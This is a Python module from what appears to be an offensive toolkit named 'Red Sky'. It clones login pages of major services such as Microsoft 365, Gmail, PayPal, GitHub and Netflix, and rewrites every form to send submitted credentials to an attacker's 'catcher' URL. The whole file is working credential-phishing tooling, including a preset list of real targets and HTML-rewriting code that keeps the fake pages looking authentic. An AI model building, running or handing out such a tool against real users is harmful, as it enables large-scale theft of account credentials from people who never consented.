# language: Python, file: Program/phish/templates.py, target: Red Sky phish — templates
# Clone a login page, rewrite form actions to point at our catcher, save as a
# servable template. Supports O365, Gmail, generic SSO, custom.

import re
import shutil
import sys
from pathlib import Path
from typing import List, Optional
from urllib.parse import urlparse

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
TEMPLATES_DIR = OUTPUT_DIR / "phish" / "templates"


PRESETS = {
    "o365":     "https://login.microsoftonline.com/",
    "gmail":    "https://accounts.google.com/signin/v2/identifier",
    "outlook":  "https://outlook.office.com/mail/",
    "facebook": "https://www.facebook.com/login",
    "instagram":"https://www.instagram.com/accounts/login/",
    "twitter":  "https://twitter.com/i/flow/login",
    "linkedin": "https://www.linkedin.com/login",
    "github":   "https://github.com/login",
    "dropbox":  "https://www.dropbox.com/login",
    "paypal":   "https://www.paypal.com/signin",
    "steam":    "https://store.steampowered.com/login/",
    "netflix":  "https://www.netflix.com/login",
}


# assets we want to fetch alongside the page
ASSET_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".woff2", ".ico")


def _fetch(url: str, timeout: int = 15) -> Optional[requests.Response]:
    try:
        r = requests.get(url, headers={"User-Agent": UA}, timeout=timeout,
                        allow_redirects=True, verify=False)
        return r
    except requests.RequestException as e:
        print_warn(f"fetch failed: {e}")
        return None


def _rewrite_html(html: str, source_url: str, catcher_url: str, template_dir: Path) -> str:
    """Rewrite form actions to point at our catcher. Rewrite asset URLs to local."""
    parsed = urlparse(source_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # rewrite <form action="..."> to POST to our catcher
    html = re.sub(
        r'(<form[^>]*?\saction=["\'])([^"\']*)(["\'])',
        lambda m: m.group(1) + catcher_url + m.group(3),
        html, flags=re.IGNORECASE,
    )
    # if a form had no action, add one
    html = re.sub(
        r'<form(?![^>]*\saction=)([^>]*)>',
        lambda m: f'<form action="{catcher_url}" {m.group(1)}>',
        html, flags=re.IGNORECASE,
    )

    # rewrite relative asset links to absolute so the saved page still loads them
    def _abs(m):
        attr, quote, path = m.group(1), m.group(2), m.group(3)
        if path.startswith(("http://", "https://", "data:", "#", "javascript:")):
            return m.group(0)
        if path.startswith("//"):
            return f'{attr}={quote}{parsed.scheme}:{path}{quote}'
        if path.startswith("/"):
            return f'{attr}={quote}{base}{path}{quote}'
        return f'{attr}={quote}{base}/{path}{quote}'

    html = re.sub(r'(href|src)=(["\'])([^"\']+)\2', _abs, html, flags=re.IGNORECASE)

    return html


def cmd_list() -> int:
    print_info(f"{len(PRESETS)} preset templates")
    print()
    for name, url in PRESETS.items():
        print(f"  {ARTERY}▓{RESET} {BONE}{name:<12}{RESET} {ASH}{url}{RESET}")
    return 0


def cmd_clone(preset_or_url: str, catcher_url: str, name: str = "") -> int:
    # resolve preset
    if preset_or_url in PRESETS:
        url = PRESETS[preset_or_url]
        name = name or preset_or_url
    elif preset_or_url.startswith(("http://", "https://")):
        url = preset_or_url
        name = name or urlparse(url).netloc.replace(".", "_")
    else:
        print_err(f"unknown preset or URL: {preset_or_url}")
        print_info(f"available presets: {', '.join(PRESETS.keys())}")
        return 2

    print_info(f"cloning {url}")
    print_kv("catcher", catcher_url)
    print_kv("output name", name)
    print()

    r = _fetch(url)
    if not r or r.status_code >= 400:
        print_err(f"cannot fetch page: {r.status_code if r else 'no response'}")
        return 1

    out_dir = TEMPLATES_DIR / name
    out_dir.mkdir(parents=True, exist_ok=True)

    rewritten = _rewrite_html(r.text, url, catcher_url, out_dir)
    index = out_dir / "index.html"
    index.write_text(rewritten, encoding="utf-8")
    print_ok(f"wrote {index}")

    # write a small note
    (out_dir / "SOURCE.txt").write_text(f"Source: {url}\nCloned: {__import__('time').ctime()}\n")

    print()
    print_kv("template dir", out_dir)
    print_info(f"serve with: redsky phish catcher --template {out_dir}")
    return 0


def cmd_show(name: str) -> int:
    d = TEMPLATES_DIR / name
    if not d.exists():
        print_err(f"no template at {d}")
        return 1
    idx = d / "index.html"
    if not idx.exists():
        print_err(f"no index.html in {d}")
        return 1
    print(idx.read_text(encoding="utf-8")[:3000])
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()
    sub = args[0]
    if sub == "clone":
        if len(args) < 3:
            print_err("clone needs: <preset_or_url> <catcher_url> [name]")
            return 2
        return cmd_clone(args[1], args[2], args[3] if len(args) > 3 else "")
    if sub == "show":
        if len(args) < 2:
            print_err("show needs a template name")
            return 2
        return cmd_show(args[1])
    # bare preset name → clone
    if sub in PRESETS and len(args) >= 2:
        return cmd_clone(sub, args[1], args[2] if len(args) > 2 else "")
    print_err(f"unknown templates action: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
